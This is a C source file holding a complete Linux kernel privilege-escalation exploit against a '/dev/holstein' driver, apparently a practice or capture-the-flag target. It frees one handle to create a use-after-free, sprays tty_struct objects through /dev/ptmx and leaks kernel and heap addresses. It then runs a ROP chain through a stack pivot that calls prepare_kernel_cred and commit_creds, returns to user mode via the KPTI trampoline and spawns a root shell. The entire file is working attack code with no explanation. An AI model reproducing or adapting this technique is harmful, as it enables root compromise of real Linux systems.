#include<sys/ioctl.h>
#include<fcntl.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>

void spawnShell(){
	if(getuid()==0){
		puts("Spawning a root shell!");
		system("/bin/sh");
	}
	else{
		puts("You are not root!");
	}
}

unsigned long user_cs,user_rflags,user_sp,user_ss;

void save_state(){
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs,cs;"
		"mov user_ss,ss;"
		"mov user_sp,rsp;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
		);
}

int main(){
	save_state();
	int spray[100];
	int fd1 = open("/dev/holstein",O_RDWR);
	int fd2 = open("/dev/holstein",O_RDWR);
	unsigned long buffer[0x400/8];
	close(fd1);

	for(int i=0;i<50;i++){
		spray[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
		if(spray[i]==-1){
			perror("open");
		}
	}
	read(fd2,buffer,sizeof(buffer));
	// for(int i=0;i<40;i++){
	// 	printf("%d -> 0x%lx\n",i,buffer[i]);
	// }
	unsigned long kernel_base = buffer[3]-0xc39c60;
	unsigned long heap_base = buffer[7] - 0x38;
	printf("Kernel base address: 0x%lx\n",kernel_base);
	printf("Heap base address: 0x%lx\n",heap_base);
// 0xffffffff8114fbea: push rdx; xor eax, 0x415b004f; pop rsp; pop rbp; ret; 
	unsigned long pivot_gadget = kernel_base + 0x14fbea;
 
	unsigned long pop_rdi_ret = kernel_base + 0x14078a;

// 0xffffffff81638e9b: mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret; 

	unsigned long mov_gadget = kernel_base + 0x638e9b;
	unsigned long pop_rcx_ret = kernel_base + 0xeb7e4;
	unsigned long prepare_kernel_cred = kernel_base + 0x72560;
	unsigned long commit_creds = kernel_base + 0x723c0;
	unsigned long kpti_trampoline = kernel_base + 0x800e10 + 22;

	buffer[3] = heap_base+0x380;
	buffer[(0x380+96)/8] = pivot_gadget;

	unsigned long *rop = &buffer[0x300/8];
	*rop++ = 0x0;
	*rop++ = pop_rdi_ret;
	*rop++ = 0x0;
	*rop++ = prepare_kernel_cred;
	*rop++ = pop_rcx_ret;
	*rop++ = 0x0;
	*rop++ = mov_gadget;
	*rop++ = commit_creds;
	*rop++ = kpti_trampoline;
	*rop++ = 0x0;
	*rop++ = 0x0;
	*rop++ = (unsigned long)spawnShell;
	*rop++ = user_cs;
	*rop++ = user_rflags;
	*rop++ = user_sp;
	*rop++ = user_ss;
	
	write(fd2,buffer,0x400);
	for(int i=0;i<50;i++){
		ioctl(spray[i],0x0,heap_base+0x300);
	}
	return 0;
}
// UAF -> create fd1 , create fd 2, close fd 1, open /dev/ptmx to gain control over tty_struct via UAF
